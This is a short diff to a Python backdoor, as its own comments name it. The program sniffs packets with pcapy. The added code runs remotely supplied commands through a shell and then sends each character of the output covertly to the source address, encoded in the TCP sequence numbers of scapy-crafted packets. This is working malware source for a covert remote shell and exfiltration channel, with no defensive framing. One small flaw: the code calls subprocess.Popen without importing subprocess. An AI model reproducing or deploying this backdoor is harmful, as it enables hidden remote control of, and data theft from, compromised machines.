@@ -1,6 +1,9 @@
 import socket
+from subprocess import Popen, PIPE
+from scapy.all import *
 from struct import *
 import sys
+import os
 import threading
 import pcapy
 import config
@@ -105,7 +108,24 @@ def executeCommand(srcAddress):
 	# check if command is within the backdoor
 	# otherwise, exec it
 	# clear command at the end
-	print command + " from "
-	print str(srcAddress)
+	print command + " from " + srcAddress
 	
+	# directory = os.system("pwd")
+	# results = os.system(command)
+	# shell = str(directory) + " > " + str(results)
+	# print shell -> send results back to client
+	results = subprocess.Popen(command, shell=True, stdout=PIPE).stdout.read()
+	print results
+
+	sendThread = threading.Thread(target=sendResults, args=(str(results),srcAddress))
+	sendThread.daemon = True
+	sendThread.start()
+
 	command = ""
+
+def sendResults(results, address):
+	# encrypt results 
+	# for each character, send a packet to address
+	for c in results:
+		print c
+		send(IP(dst=address)/TCP(dport=RandNum(1024, 65535), sport=RandNum(1024, 65535), seq=ord(c)))
